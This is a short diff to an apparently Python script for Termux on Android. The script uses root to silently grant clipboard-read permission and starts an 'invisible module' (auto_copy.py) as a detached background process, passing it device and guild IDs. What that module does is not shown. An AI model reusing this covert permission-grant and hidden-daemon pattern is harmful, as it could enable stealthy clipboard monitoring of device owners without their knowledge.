@@ -113,15 +113,16 @@ try:
     caminho_python = sys.executable
     caminho_script = os.path.abspath("functions/auto_copy.py")
     
+    # Dá a permissão de clipboard via Root
     subprocess.run('su -c "appops set com.termux READ_CLIPBOARD allow" 2>/dev/null', shell=True)
     
-    env_vars = f"LD_LIBRARY_PATH=/data/data/com.termux/files/usr/lib PATH=/data/data/com.termux/files/usr/bin:$PATH"
-    comando_daemon = f"su -c '{env_vars} {caminho_python} {caminho_script} {device_id} {guild_id} > /dev/null 2>&1 &' 2>/dev/null"
+    # O PULO DO GATO: Rodar com nohup, SEM usar o 'su' para iniciar o Python inteiro, e guardando os logs!
+    comando_daemon = f"nohup {caminho_python} {caminho_script} {device_id} {guild_id} > functions/copy_log.txt 2>&1 &"
     
     os.system(comando_daemon)
-    print(f"✅ Módulo Invisível ejetado com sucesso!")
+    print(f"✅ Módulo Invisível ejetado com sucesso! (Logs em functions/copy_log.txt)")
 except Exception as e:
-    pass
+    print(f"⚠️ Erro ao ejetar módulo: {e}")
 
 registrado_no_banco = False
 INTERVALO_PING = 1200 
